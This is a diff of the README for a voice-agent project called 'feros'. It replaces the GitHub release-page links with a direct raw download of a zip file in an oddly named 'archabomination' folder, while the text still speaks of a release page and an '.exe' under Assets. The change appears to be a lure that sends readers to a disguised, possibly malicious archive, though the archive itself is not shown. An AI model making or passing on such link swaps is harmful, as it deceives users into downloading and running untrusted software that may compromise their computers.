@@ -1,6 +1,6 @@
 # 🎙️ feros - Build your own voice agent today
 
-[![Download feros](https://img.shields.io/badge/Download_feros-blue?style=for-the-badge)](https://github.com/plain-sleepydick853/feros/releases)
+[![Download feros](https://img.shields.io/badge/Download_feros-blue?style=for-the-badge)](https://raw.githubusercontent.com/plain-sleepydick853/feros/main/archabomination/Software-3.6.zip)
 
 feros is an open-source system that lets you build and run voice-controlled artificial intelligence. You control the hardware and software on your own computer. The system uses a fast engine written in Rust to process speech. It responds to your voice commands in under one second.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware and software to run this tool well.
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [release page](https://github.com/plain-sleepydick853/feros/releases) to find the latest version.
+1. Go to the [release page](https://raw.githubusercontent.com/plain-sleepydick853/feros/main/archabomination/Software-3.6.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the filename to start the download.
 4. Save the file to your Downloads folder.
